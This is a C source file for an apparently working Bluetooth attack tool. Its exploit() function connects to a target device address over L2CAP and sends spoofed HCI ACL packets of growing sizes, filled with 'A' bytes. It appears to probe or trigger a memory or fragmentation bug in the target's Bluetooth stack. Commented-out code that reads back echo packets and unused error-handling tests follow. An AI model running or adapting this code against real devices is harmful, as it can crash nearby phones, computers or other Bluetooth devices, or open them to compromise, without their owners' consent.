#include "log.h"
#include "errors.h"
#include "bluetooth.h"

#include <time.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

err_t exploit(const char *bdaddr_str)
{
    // Create both sockets
    int hci_sock_fd, l2cap_sock_fd;
    ERR_FWD(bluetooth_hci_create(&hci_sock_fd));
    ERR_FWD(bluetooth_l2cap_create(&l2cap_sock_fd));

    // Connect to the Bluetooth address
    uint16_t hci_handle;
    ERR_FWD(bluetooth_l2cap_connect(l2cap_sock_fd, bdaddr_str, &hci_handle))

    uint8_t buffer[512];
    memset(buffer, 'A', sizeof(buffer));

    ERR_FWD(bluetooth_hci_spoof_acl(hci_sock_fd, hci_handle, 0, 0, false, buffer, 70))

    for (size_t i = 50; i < 250; i++)
    {
        // size_t size = i < 50 ? 50 : i;
        // size_t size = 70;

        // packet 0 => size 0 + 2 extra
        // packet 1 => size 0
        // packet 1 => size 1 + 2 extra
        // packet 2 => size 1

        ERR_FWD(bluetooth_hci_spoof_acl(hci_sock_fd, hci_handle, i, 2, false, buffer, i))
        ERR_FWD(bluetooth_hci_spoof_acl(hci_sock_fd, hci_handle, i + 1, 0, true, buffer, i))

        struct timespec ts = 
        {
            .tv_sec = 0,
            .tv_nsec = 100 * 1000 * 1000 // 100 ms
        };
        nanosleep(&ts, NULL);
    }

    // // Spoof an echo packet
    // uint8_t data[512];

    // memset(data, 'A', sizeof(data));
    // ERR_FWD(bluetooth_hci_spoof_acl(hci_sock_fd, hci_handle, 0, 0, false, data, 70))

    // // memset(data, 'A', sizeof(data));
    // ERR_FWD(bluetooth_hci_spoof_acl(hci_sock_fd, hci_handle, 1, 2, false, data, 70))

    // // memset(data, 'A', sizeof(data));
    // ERR_FWD(bluetooth_hci_spoof_acl(hci_sock_fd, hci_handle, 1, 3, true, data, 70))

    // // Receive the echo packet
    // while (1)
    // {
    //     size_t read_amount;
    //     ERR_FWD(bluetooth_l2cap_recv(l2cap_sock_fd, data, sizeof(data), &read_amount));
    //     logl_hex(data, read_amount);
    // }

    // ERR_FWD(bluetooth_l2cap_recv(l2cap_sock_fd, data, 100, &read_amount));
    // ERR_FWD(bluetooth_l2cap_recv(l2cap_sock_fd, data, 100, &read_amount));
    // ERR_FWD(bluetooth_l2cap_recv(l2cap_sock_fd, data, 100, &read_amount));

    return NULL;
}

int main(int argc, char **argv)
{
    if (argc != 2)
    {
        printf("Usage: %s <bdaddr>\n", argv[0]);
        printf("Example: %s 00:11:22:33:44:55\n", argv[0]);

        return -1;
    }

    int ret = 0;

    err_t err = exploit(argv[1]);
    if (err)
    {
        err_print_free(err);
        ret = -1;
    }

    return ret;
}

// err_t func1();
// err_t func2();
// err_t func3();
// err_t func4();

// int main(int argc, char **argv)
// {
//     printf("Hello, world!\n");

//     err_print_free(func4());

//     return 0;
// }

// err_t func1()
// {
//     // ERR_RET("ERR1", NULL);

//     // ERR_RET("ERR1", "Aw Snap!");

//     // char msg[] = "Aw Snap!";
//     // ERR_RET("ERR1", msg);

//     char *msg = (char*)malloc(9);
//     strcpy(msg, "Aw Snap!");
//     ERR_RET("ERR1", msg);

//     return NULL;
// }

// err_t func2()
// {
//     // ERR_FWD(func1());

//     err_t err = func1();
//     ERR_FWD(err);
// }

// err_t func3()
// {
//     ERR_FWD_MSG("ERR3", func2());
// }

// err_t func4()
// {
//     ERR_FWD(func3());
// }
